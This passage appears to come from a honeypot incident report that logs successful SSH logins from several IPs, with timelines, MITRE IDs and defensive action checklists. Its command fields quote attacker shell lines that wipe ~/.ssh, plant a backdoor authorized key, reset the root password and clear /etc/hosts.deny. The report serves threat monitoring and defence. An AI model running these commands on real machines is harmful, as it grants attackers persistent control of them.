| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 17:18:21` | `cowrie.session.connect` |
| `2026-04-05 17:18:21` | `cowrie.client.version` |
| `2026-04-05 17:18:21` | `cowrie.client.kex` |
| `2026-04-05 17:18:22` | `cowrie.login.success` |
| `2026-04-05 17:18:22` | `cowrie.session.params` |
| `2026-04-05 17:18:22` | `cowrie.command.input` |
| `2026-04-05 17:18:22` | `cowrie.command.failed` |
| `2026-04-05 17:18:22` | `cowrie.log.closed` |
| `2026-04-05 17:18:23` | `cowrie.session.params` |
| `2026-04-05 17:18:23` | `cowrie.command.input` |
| `2026-04-05 17:18:23` | `cowrie.session.file_download` |
| `2026-04-05 17:18:23` | `cowrie.log.closed` |
| `2026-04-05 17:18:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.184.119[.]22` to AbuseIPDB if not already reported
- [ ] Block `112.184.119[.]22` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e33d21c443d6

| Field | Detail |
|---|---|
| **Source IP** | `112.184.119[.]22` |
| **First Seen** | 2026-04-05 17:18 |
| **Last Seen** | 2026-04-05 17:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 17:18:25` | `cowrie.session.connect` |
| `2026-04-05 17:18:25` | `cowrie.client.version` |
| `2026-04-05 17:18:25` | `cowrie.client.kex` |
| `2026-04-05 17:18:26` | `cowrie.login.success` |
| `2026-04-05 17:18:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.184.119[.]22` to AbuseIPDB if not already reported
- [ ] Block `112.184.119[.]22` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d708228a6d03

| Field | Detail |
|---|---|
| **Source IP** | `180.76.104[.]44` |
| **First Seen** | 2026-04-05 17:32 |
| **Last Seen** | 2026-04-05 17:33 |
| **Session Duration** | 47s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:6jcMo5KCbhCc"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 17:32:58` | `cowrie.session.connect` |
| `2026-04-05 17:32:58` | `cowrie.client.version` |
| `2026-04-05 17:32:58` | `cowrie.client.kex` |
| `2026-04-05 17:33:02` | `cowrie.login.success` |
| `2026-04-05 17:33:03` | `cowrie.session.params` |
| `2026-04-05 17:33:03` | `cowrie.command.input` |
| `2026-04-05 17:33:03` | `cowrie.command.failed` |
| `2026-04-05 17:33:04` | `cowrie.log.closed` |
| `2026-04-05 17:33:07` | `cowrie.session.params` |
| `2026-04-05 17:33:07` | `cowrie.command.input` |
| `2026-04-05 17:33:09` | `cowrie.session.file_download` |
| `2026-04-05 17:33:09` | `cowrie.log.closed` |
| `2026-04-05 17:33:21` | `cowrie.session.params` |
| `2026-04-05 17:33:21` | `cowrie.command.input` |
| `2026-04-05 17:33:21` | `cowrie.log.closed` |
| `2026-04-05 17:33:25` | `cowrie.session.params` |
| `2026-04-05 17:33:25` | `cowrie.command.input` |
| `2026-04-05 17:33:26` | `cowrie.log.closed` |
| `2026-04-05 17:33:27` | `cowrie.session.params` |
| `2026-04-05 17:33:27` | `cowrie.command.input` |
| `2026-04-05 17:33:28` | `cowrie.session.file_download` |
| `2026-04-05 17:33:28` | `cowrie.log.closed` |
| `2026-04-05 17:33:29` | `cowrie.session.params` |
| `2026-04-05 17:33:29` | `cowrie.command.input` |
| `2026-04-05 17:33:30` | `cowrie.log.closed` |
| `2026-04-05 17:33:32` | `cowrie.session.params` |
| `2026-04-05 17:33:32` | `cowrie.command.input` |
| `2026-04-05 17:33:32` | `cowrie.log.closed` |
| `2026-04-05 17:33:33` | `cowrie.session.params` |
| `2026-04-05 17:33:33` | `cowrie.command.input` |
| `2026-04-05 17:33:33` | `cowrie.command.input` |
| `2026-04-05 17:33:34` | `cowrie.log.closed` |
| `2026-04-05 17:33:35` | `cowrie.session.params` |
| `2026-04-05 17:33:35` | `cowrie.command.input` |
| `2026-04-05 17:33:35` | `cowrie.log.closed` |
| `2026-04-05 17:33:37` | `cowrie.session.params` |
| `2026-04-05 17:33:37` | `cowrie.command.input` |
| `2026-04-05 17:33:37` | `cowrie.log.closed` |
| `2026-04-05 17:33:37` | `cowrie.session.params` |
| `2026-04-05 17:33:37` | `cowrie.command.input` |
| `2026-04-05 17:33:37` | `cowrie.log.closed` |
| `2026-04-05 17:33:38` | `cowrie.session.params` |
| `2026-04-05 17:33:38` | `cowrie.command.input` |
| `2026-04-05 17:33:38` | `cowrie.log.closed` |
| `2026-04-05 17:33:40` | `cowrie.session.params` |
| `2026-04-05 17:33:40` | `cowrie.command.input` |
| `2026-04-05 17:33:41` | `cowrie.log.closed` |
| `2026-04-05 17:33:41` | `cowrie.session.params` |
| `2026-04-05 17:33:41` | `cowrie.command.input` |
| `2026-04-05 17:33:41` | `cowrie.log.closed` |
| `2026-04-05 17:33:42` | `cowrie.session.params` |
| `2026-04-05 17:33:42` | `cowrie.command.input` |
| `2026-04-05 17:33:42` | `cowrie.log.closed` |
| `2026-04-05 17:33:44` | `cowrie.session.params` |
| `2026-04-05 17:33:44` | `cowrie.command.input` |
| `2026-04-05 17:33:44` | `cowrie.log.closed` |
| `2026-04-05 17:33:44` | `cowrie.session.params` |
| `2026-04-05 17:33:44` | `cowrie.command.input` |
| `2026-04-05 17:33:44` | `cowrie.log.closed` |
| `2026-04-05 17:33:45` | `cowrie.session.params` |
| `2026-04-05 17:33:45` | `cowrie.command.input` |
| `2026-04-05 17:33:45` | `cowrie.log.closed` |
| `2026-04-05 17:33:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.76.104[.]44` to AbuseIPDB if not already reported
- [ ] Block `180.76.104[.]44` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a744c442d8f

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-04-05 17:34 |
| **Last Seen** | 2026-04-05 17:34 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 17:34:50` | `cowrie.session.connect` |
| `2026-04-05 17:34:50` | `cowrie.client.version` |
| `2026-04-05 17:34:50` | `cowrie.client.kex` |
| `2026-04-05 17:34:52` | `cowrie.login.success` |
| `2026-04-05 17:34:52` | `cowrie.session.params` |
| `2026-04-05 17:34:52` | `cowrie.command.input` |
| `2026-04-05 17:34:52` | `cowrie.command.failed` |
| `2026-04-05 17:34:53` | `cowrie.log.closed` |
| `2026-04-05 17:34:53` | `cowrie.session.params` |
| `2026-04-05 17:34:53` | `cowrie.command.input` |
| `2026-04-05 17:34:54` | `cowrie.session.file_download` |
| `2026-04-05 17:34:54` | `cowrie.log.closed` |
| `2026-04-05 17:34:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-840c11f517f9

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-04-05 17:34 |
| **Last Seen** | 2026-04-05 17:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 17:34:57` | `cowrie.session.connect` |
| `2026-04-05 17:34:57` | `cowrie.client.version` |
| `2026-04-05 17:34:57` | `cowrie.client.kex` |
| `2026-04-05 17:34:59` | `cowrie.login.success` |
| `2026-04-05 17:34:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e839847b572b

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-04-05 17:35 |
| **Last Seen** | 2026-04-05 17:36 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 17:35:53` | `cowrie.session.connect` |
| `2026-04-05 17:35:53` | `cowrie.client.version` |
| `2026-04-05 17:35:53` | `cowrie.client.kex` |
| `2026-04-05 17:35:54` | `cowrie.login.success` |
| `2026-04-05 17:35:55` | `cowrie.session.params` |
| `2026-04-05 17:35:55` | `cowrie.command.input` |
| `2026-04-05 17:35:55` | `cowrie.command.failed` |
| `2026-04-05 17:35:55` | `cowrie.log.closed` |
| `2026-04-05 17:35:56` | `cowrie.session.params` |
| `2026-04-05 17:35:56` | `cowrie.command.input` |
| `2026-04-05 17:35:56` | `cowrie.session.file_download` |
| `2026-04-05 17:35:56` | `cowrie.log.closed` |
| `2026-04-05 17:36:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49af38ed5c4b

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-04-05 17:36 |
| **Last Seen** | 2026-04-05 17:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 17:36:00` | `cowrie.session.connect` |
| `2026-04-05 17:36:00` | `cowrie.client.version` |
| `2026-04-05 17:36:00` | `cowrie.client.kex` |
| `2026-04-05 17:36:01` | `cowrie.login.success` |
| `2026-04-05 17:36:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5c952e22042

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-04-05 17:37 |
| **Last Seen** | 2026-04-05 17:37 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 17:37:01` | `cowrie.session.connect` |
| `2026-04-05 17:37:01` | `cowrie.client.version` |
| `2026-04-05 17:37:01` | `cowrie.client.kex` |
| `2026-04-05 17:37:02` | `cowrie.login.success` |
| `2026-04-05 17:37:03` | `cowrie.session.params` |
| `2026-04-05 17:37:03` | `cowrie.command.input` |
| `2026-04-05 17:37:03` | `cowrie.command.failed` |
| `2026-04-05 17:37:03` | `cowrie.log.closed` |
| `2026-04-05 17:37:04` | `cowrie.session.params` |
| `2026-04-05 17:37:04` | `cowrie.command.input` |
| `2026-04-05 17:37:04` | `cowrie.session.file_download` |
| `2026-04-05 17:37:04` | `cowrie.log.closed` |
| `2026-04-05 17:37:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cea3a2f5f0f2

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-04-05 17:37 |
| **Last Seen** | 2026-04-05 17:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 17:37:08` | `cowrie.session.connect` |
| `2026-04-05 17:37:08` | `cowrie.client.version` |
| `2026-04-05 17:37:08` | `cowrie.client.kex` |
| `2026-04-05 17:37:09` | `cowrie.login.success` |
| `2026-04-05 17:37:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1c4d77a48db

| Field | Detail |
|---|---|
| **Source IP** | `181.49.8[.]57` |
| **First Seen** | 2026-04-05 17:37 |
| **Last Seen** | 2026-04-05 17:37 |
| **Session Duration** | 28s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:vm38XiNxh8QR"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 17:37:22` | `cowrie.session.connect` |
| `2026-04-05 17:37:22` | `cowrie.client.version` |
| `2026-04-05 17:37:23` | `cowrie.client.kex` |
| `2026-04-05 17:37:24` | `cowrie.login.success` |
| `2026-04-05 17:37:25` | `cowrie.session.params` |
| `2026-04-05 17:37:25` | `cowrie.command.input` |
| `2026-04-05 17:37:25` | `cowrie.command.failed` |
| `2026-04-05 17:37:25` | `cowrie.log.closed` |
| `2026-04-05 17:37:26` | `cowrie.session.params` |
| `2026-04-05 17:37:26` | `cowrie.command.input` |
| `2026-04-05 17:37:26` | `cowrie.session.file_download` |
| `2026-04-05 17:37:26` | `cowrie.log.closed` |
| `2026-04-05 17:37:35` | `cowrie.session.params` |
| `2026-04-05 17:37:35` | `cowrie.command.input` |
| `2026-04-05 17:37:36` | `cowrie.log.closed` |
| `2026-04-05 17:37:36` | `cowrie.session.params` |
| `2026-04-05 17:37:36` | `cowrie.command.input` |
| `2026-04-05 17:37:37` | `cowrie.log.closed` |
| `2026-04-05 17:37:37` | `cowrie.session.params` |
| `2026-04-05 17:37:37` | `cowrie.command.input` |
| `2026-04-05 17:37:38` | `cowrie.session.file_download` |
| `2026-04-05 17:37:38` | `cowrie.log.closed` |
| `2026-04-05 17:37:38` | `cowrie.session.params` |
| `2026-04-05 17:37:38` | `cowrie.command.input` |
| `2026-04-05 17:37:39` | `cowrie.log.closed` |
| `2026-04-05 17:37:39` | `cowrie.session.params` |
| `2026-04-05 17:37:39` | `cowrie.command.input` |
| `2026-04-05 17:37:40` | `cowrie.log.closed` |
| `2026-04-05 17:37:40` | `cowrie.session.params` |
| `2026-04-05 17:37:40` | `cowrie.command.input` |
| `2026-04-05 17:37:40` | `cowrie.command.input` |
| `2026-04-05 17:37:41` | `cowrie.log.closed` |
| `2026-04-05 17:37:41` | `cowrie.session.params` |
| `2026-04-05 17:37:41` | `cowrie.command.input` |
| `2026-04-05 17:37:43` | `cowrie.log.closed` |
| `2026-04-05 17:37:43` | `cowrie.session.params` |
| `2026-04-05 17:37:43` | `cowrie.command.input` |
| `2026-04-05 17:37:43` | `cowrie.log.closed` |
| `2026-04-05 17:37:44` | `cowrie.session.params` |
| `2026-04-05 17:37:44` | `cowrie.command.input` |
| `2026-04-05 17:37:44` | `cowrie.log.closed` |
| `2026-04-05 17:37:45` | `cowrie.session.params` |
| `2026-04-05 17:37:45` | `cowrie.command.input` |
| `2026-04-05 17:37:45` | `cowrie.log.closed` |
| `2026-04-05 17:37:46` | `cowrie.session.params` |
| `2026-04-05 17:37:46` | `cowrie.command.input` |
| `2026-04-05 17:37:46` | `cowrie.log.closed` |
| `2026-04-05 17:37:47` | `cowrie.session.params` |
| `2026-04-05 17:37:47` | `cowrie.command.input` |
| `2026-04-05 17:37:47` | `cowrie.log.closed` |
| `2026-04-05 17:37:48` | `cowrie.session.params` |
| `2026-04-05 17:37:48` | `cowrie.command.input` |
| `2026-04-05 17:37:48` | `cowrie.log.closed` |
| `2026-04-05 17:37:49` | `cowrie.session.params` |
| `2026-04-05 17:37:49` | `cowrie.command.input` |
| `2026-04-05 17:37:49` | `cowrie.log.closed` |
| `2026-04-05 17:37:50` | `cowrie.session.params` |
| `2026-04-05 17:37:50` | `cowrie.command.input` |
| `2026-04-05 17:37:50` | `cowrie.log.closed` |
| `2026-04-05 17:37:51` | `cowrie.session.params` |
| `2026-04-05 17:37:51` | `cowrie.command.input` |
| `2026-04-05 17:37:51` | `cowrie.log.closed` |
| `2026-04-05 17:37:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.49.8[.]57` to AbuseIPDB if not already reported
- [ ] Block `181.49.8[.]57` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b998291a9b8

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-04-05 17:38 |
| **Last Seen** | 2026-04-05 17:38 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 17:38:06` | `cowrie.session.connect` |
| `2026-04-05 17:38:06` | `cowrie.client.version` |
| `2026-04-05 17:38:06` | `cowrie.client.kex` |
| `2026-04-05 17:38:07` | `cowrie.login.success` |
| `2026-04-05 17:38:08` | `cowrie.session.params` |
| `2026-04-05 17:38:08` | `cowrie.command.input` |
| `2026-04-05 17:38:08` | `cowrie.command.failed` |
| `2026-04-05 17:38:08` | `cowrie.log.closed` |
| `2026-04-05 17:38:09` | `cowrie.session.params` |
| `2026-04-05 17:38:09` | `cowrie.command.input` |
| `2026-04-05 17:38:09` | `cowrie.session.file_download` |
| `2026-04-05 17:38:09` | `cowrie.log.closed` |
| `2026-04-05 17:38:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ccd9a6b277c4

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-04-05 17:38 |
| **Last Seen** | 2026-04-05 17:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 17:38:13` | `cowrie.session.connect` |
| `2026-04-05 17:38:13` | `cowrie.client.version` |
| `2026-04-05 17:38:13` | `cowrie.client.kex` |
| `2026-04-05 17:38:14` | `cowrie.login.success` |
| `2026-04-05 17:38:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a9b1bece2ae

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-04-05 17:41 |
| **Last Seen** | 2026-04-05 17:41 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
